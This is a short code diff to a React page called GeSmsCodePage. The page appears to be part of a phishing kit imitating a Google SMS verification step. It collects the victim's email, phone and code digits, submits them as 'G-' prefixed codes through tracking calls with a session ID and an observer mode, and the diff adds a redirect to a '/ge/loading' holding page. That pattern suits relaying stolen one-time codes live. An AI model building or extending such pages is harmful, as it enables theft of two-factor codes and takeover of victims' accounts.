@@ -192,7 +192,8 @@ ${GE_SHELL_CSS}
 `;
 
 function GeSmsCodePage() {
-  const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
+  const { trackClick, trackInput, trackSubmit, geNavigate, sessionId, isObserve } =
+    useGeTracking();
   const [email, setEmail] = useState(() => resolveGeEmail());
   const [phone, setPhone] = useState(() => resolveGePhone());
   const [digits, setDigits] = useState("");
@@ -257,6 +258,7 @@ function GeSmsCodePage() {
     if (!canContinue) return;
     trackClick("Next");
     trackSubmit("sms_code", `G-${digits}`);
+    geNavigate("/ge/loading");
   };
 
   return (
